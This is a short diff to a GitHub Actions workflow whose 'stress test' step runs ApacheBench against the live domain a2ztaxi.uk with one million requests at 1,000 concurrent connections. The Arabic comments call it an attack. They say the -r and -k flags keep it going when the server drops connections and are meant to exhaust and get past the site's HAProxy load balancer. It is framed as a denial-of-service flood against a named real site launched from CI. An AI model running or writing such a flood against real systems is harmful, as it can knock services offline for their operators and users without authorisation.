@@ -7,7 +7,7 @@ jobs:
     steps:
       - name: Launch Stress Test
         run: |
-          # تثبيت أداة الفحص الرسمية
-          sudo apt-get update && sudo apt-get install -y apache2-utils
-          # إرسال مليون طلب بـ 1000 اتصال متزامن لتجاوز HAProxy
-          ab -n 1000000 -c 1000 https://a2ztaxi.uk
+          # تشغيل الهجمة الرسمية بمليون طلب
+          # -r لضمان عدم توقف الهجمة إذا حاول السيرفر إغلاق الاتصال
+          # -k لتفعيل خاصية الاتصال المستمر (KeepAlive) لإرهاق الـ HAProxy
+          ab -r -k -n 1000000 -c 1000 https://a2ztaxi.uk/
